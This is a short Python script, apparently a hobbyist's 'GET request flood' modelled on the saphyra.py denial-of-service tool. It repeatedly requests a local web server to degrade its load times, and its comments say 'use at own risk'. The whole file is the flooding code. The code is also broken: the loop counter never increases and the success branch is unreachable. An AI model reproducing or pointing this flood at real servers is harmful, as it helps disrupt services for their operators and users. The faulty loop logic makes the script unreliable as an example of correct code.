# Get Request Flood
# Effective for some second
# Because NGINX will block this request after some second
# When you try to reload the client page and inspect the network waterfall
# You'll notice load time increase when this script is running
# Inspired by saphyra.py script by Anonymous
# Use at own risk!
# VladRafli

import requests

i = 0
while i < 100:
    x = requests.get('http://localhost:80')
    if x.status_code != 200:
        print("Get request failed with code", x.status_code)
        print("Program exited")
        exit(1)
    if i == 100:
        print("Command successfully executed")
        exit(0)